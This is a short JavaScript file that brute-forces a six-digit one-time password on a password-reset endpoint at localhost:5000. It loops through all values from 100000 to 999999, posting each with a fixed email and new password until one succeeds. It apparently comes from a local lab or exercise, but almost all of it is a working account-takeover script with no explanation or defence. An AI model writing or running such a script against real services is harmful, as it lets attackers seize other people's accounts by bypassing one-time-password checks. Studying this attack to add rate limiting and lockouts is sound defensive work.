import axios from "axios"

async function SendRequest(otp){
    let data = JSON.stringify({
        "email": "aryan@op.com",
        "otp": otp,
        "newPassword": "newOne"
        });

        let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:5000/reset-password',
        headers: { 
            'Content-Type': 'application/json'
        },
        data : data
    };
    
    return await axios.request(config)
        .then((response) => {
        return JSON.stringify(response.data);
        })
        .catch((error) => {
        });

}

for(let i=100000;i<=999999;i++){
   console.log(i.toString());
   const success = await SendRequest(i.toString());
   if (success) {
        console.log("OTP FOUND:", i);
        break;   //  STOP LOOP
    }
   
}
